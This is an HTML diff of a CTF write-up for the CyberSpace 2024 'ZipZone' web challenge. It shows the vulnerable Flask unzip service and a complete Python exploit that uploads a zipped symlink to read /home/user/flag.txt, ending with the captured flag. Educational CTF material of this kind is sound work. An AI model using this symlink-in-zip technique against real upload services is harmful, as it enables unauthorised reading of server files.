@@ -5,7 +5,7 @@
     <meta charset="utf-8">
     <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title> - ByteTheCookies</title>
+    <title>ZipZone - ByteTheCookies</title>
 
     
 
@@ -18,37 +18,31 @@
     
         <meta property="og:url" content="http://localhost:1313/writeups/cyberspace2024/zipzone/">
   <meta property="og:site_name" content="ByteTheCookies">
-  <meta property="og:title" content="ByteTheCookies">
-  <meta property="og:description" content="Zipzone Description: …
-Introduction …
-Source …
-# filename: file.py …
-Solution …
-# filename: file.py $ flag: flag{redacted} Author: ... ">
+  <meta property="og:title" content="ZipZone">
+  <meta property="og:description" content="Zipzone Description: I was tired of trying to find a good file server for zip files, so I made my own! It’s still a work in progress, but I think it’s pretty good so far.
+Link: https://zipzone-web.challs.csc.tf/
+Introduction ZipZone is the only one web in the beginner’s category and, as the title suggests, you have to upload zip files that will be unzipped later, so you have to download the extracted files afterwards.">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="writeups">
     <meta property="article:published_time" content="2024-09-02T10:59:17+02:00">
-    <meta property="article:modified_time" content="2024-09-02T10:59:17+02:00">
-    <meta property="article:tag" content="Category">
-    <meta property="article:tag" content="Language">
-    <meta property="article:tag" content="Attack Type">
-    <meta property="article:tag" content="N Points">
-    <meta property="article:tag" content="N Solves">
-    <meta property="article:tag" content="Authors">
+    <meta property="article:modified_time" content="2024-09-02T11:17:58+02:00">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Python">
+    <meta property="article:tag" content="Symlink">
+    <meta property="article:tag" content="50 Points">
+    <meta property="article:tag" content="173 Solves">
+    <meta property="article:tag" content="Rex">
 
     
 
     
         
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="ByteTheCookies">
-  <meta name="twitter:description" content="Zipzone Description: …
-Introduction …
-Source …
-# filename: file.py …
-Solution …
-# filename: file.py $ flag: flag{redacted} Author: ... ">
+  <meta name="twitter:title" content="ZipZone">
+  <meta name="twitter:description" content="Zipzone Description: I was tired of trying to find a good file server for zip files, so I made my own! It’s still a work in progress, but I think it’s pretty good so far.
+Link: https://zipzone-web.challs.csc.tf/
+Introduction ZipZone is the only one web in the beginner’s category and, as the title suggests, you have to upload zip files that will be unzipped later, so you have to download the extracted files afterwards.">
 
     <link rel="stylesheet" href="/style.css" integrity="">
 
@@ -248,22 +242,22 @@ Solution …
 
 <div class="tags">
   
-    <div class="badge">category</div>
+    <div class="badge">Web</div>
 
   
-    <div class="badge">language</div>
+    <div class="badge">Python</div>
 
   
-    <div class="badge">attack type</div>
+    <div class="badge">Symlink</div>
 
   
-    <div class="badge">n points</div>
+    <div class="badge">50 points</div>
 
   
-    <div class="badge">n solves</div>
+    <div class="badge">173 solves</div>
 
   
-    <div class="badge">authors</div>
+    <div class="badge">rex</div>
 
   
 </div>
@@ -286,33 +280,154 @@ Solution …
         
     
     <h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>Zipzone</h1>
-<p><strong>Description</strong>: &hellip;</p>
+<p><strong>Description</strong>: I was tired of trying to find a good file server for zip files, so I made my own! It&rsquo;s still a work in progress, but I think it&rsquo;s pretty good so far.</p>
+<p><strong>Link</strong>: <a href="https://zipzone-web.challs.csc.tf/">https://zipzone-web.challs.csc.tf/</a></p>
 
 <h2>Introduction</h2>
 
-<p>&hellip;</p>
+<p>ZipZone is the only one web in the beginner&rsquo;s category and, as the title suggests, you have to upload zip files that will be unzipped later, so you have to download the extracted files afterwards.</p>
 
 <h2>Source</h2>
 
-<p>&hellip;</p>
-<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: file.py
+<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: app.py
+
+import logging
+import os
+import subprocess
+import uuid
+
+from flask import (
+    Flask,
+    abort,
+    flash,
+    redirect,
+    render_template,
+    request,
+    send_from_directory,
+)
+
+app = Flask(__name__)
+upload_dir = &quot;/tmp/&quot;
+
+app.config[&quot;MAX_CONTENT_LENGTH&quot;] = 1 * 10**6  # 1 MB
+app.config[&quot;SECRET_KEY&quot;] = os.urandom(32)
 
 
+@app.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
+def upload():
+    if request.method == &quot;GET&quot;:
+        return render_template(&quot;index.html&quot;)
+
+    if &quot;file&quot; not in request.files:
+        flash(&quot;No file part!&quot;, &quot;danger&quot;)
+        return render_template(&quot;index.html&quot;)
+
+    file = request.files[&quot;file&quot;]
+    if file.filename.split(&quot;.&quot;)[-1].lower() != &quot;zip&quot;:
+        flash(&quot;Only zip files allowed are allowed!&quot;, &quot;danger&quot;)
+        return render_template(&quot;index.html&quot;)
+
+    upload_uuid = str(uuid.uuid4())
+    filename = f&quot;{upload_dir}raw/{upload_uuid}.zip&quot;
+    file.save(filename)
+    subprocess.call([&quot;unzip&quot;, filename, &quot;-d&quot;, f&quot;{upload_dir}files/{upload_uuid}&quot;])
+
+    print(f&quot;Unzipped {filename} to {upload_dir}files/{upload_uuid}&quot;)
+
+    flash(
+        f'Your file is at &lt;a href=&quot;/files/{upload_uuid}&quot;&gt;{upload_uuid}&lt;/a&gt;!', &quot;success&quot;
+    )
+    logging.info(f&quot;User uploaded file {upload_uuid}.&quot;)
+    return redirect(&quot;/&quot;)
+
+
+@app.route(&quot;/files/&lt;path:path&gt;&quot;)
+def files(path):
+    try:
+        return send_from_directory(upload_dir + &quot;files&quot;, path)
+    except PermissionError:
+        abort(404)
+
+
+@app.errorhandler(404)
+def page_not_found(error):
+    return render_template(&quot;404.html&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run(debug=True, host=&quot;0.0.0.0&quot;, port=5000)
 
 </code></pre>
-<p>&hellip;</p>
 
 <h2>Solution</h2>
 
-<p>&hellip;</p>
-<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: file.py
+<p>Being actually a web in the beginner category, I initially just gave a quick read to the source code, where in fact no checks are done on the files inside the zipper, but only on the zipper itself, where we see the extension is checked</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: exploit.py
+
+#!/usr/bin/python3
+
+import os
+import subprocess
+import requests
+from bs4 import BeautifulSoup
+
+BASE_URL = &quot;https://zipzone-web.challs.csc.tf&quot;
+URL_HOOK = &quot;&quot;
+
+def get_uuid(text):
+  soup = BeautifulSoup(text, 'html.parser')
+  for a in soup.find_all('a', href=True):
+    if a['href']:
+      return a['href'].split('/')[-1]
 
 
+def upload_file(file_path):
+  with open(file_path, &quot;rb&quot;) as f:
+    files = {&quot;file&quot;: f}
+    response = requests.post(BASE_URL, files=files)
+    return get_uuid(response.text)
+
+
+def create_exploit(zip_filename:str,symlink_name:str,symlink_target:str):
+    os.symlink(symlink_target, symlink_name)
+    subprocess.run(['zip', '-y', zip_filename, symlink_name], check=True)
+    print(f'{zip_filename} created.')
+    os.remove(symlink_name)
+
+def get_flag(UUID):
+  response = requests.get(f'{BASE_URL}/files/{UUID}/evil_link',stream=True)
+  if response.status_code == 200:
+    with open(&quot;flag&quot;, 'wb') as f:
+      for chunk in response.iter_content(chunk_size=8192):
+        f.write(chunk)
+    print(f&quot;Flag download successfully&quot;)
+  else:
+      print(f&quot;Error during the download: {response.status_code}&quot;)
+
+  return open(&quot;flag&quot;, &quot;r&quot;).read().strip()
+
+def clean():
+    os.remove('exploit.zip')
+    os.remove('flag')
+
+def main():
+  create_exploit(zip_filename='exploit.zip',symlink_name='evil_link',symlink_target='/home/user/flag.txt')
+  UUID = upload_file('./exploit.zip')
+  print(f'UUID: {UUID}')
+  flag = get_flag(UUID)
+  print(f&quot;Flag: {flag}&quot;)
+  clean()
+
+if __name__ == &quot;__main__&quot;:
+  main()
+
+# goodluck by @akiidjk
 
 </code></pre>
-<pre  class="mc-prism hide language-text" ><code class="language-stdout">$ flag: flag{redacted}
+<p>The solutions is very simple, A symlink is simply created pointing to /home/user/flag, it is then zipped and sent to the page, we save the file id and in the path uuid/name_file we send the file pointing to the symlink.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-stdout">$ flag: CSCTF{5yml1nk5_4r3_w31rd}
 </code></pre>
-<p align='right'>Author: ... </p>
+<p align='right'>Author: akiidjk </p>
 
 </article>
 </div>
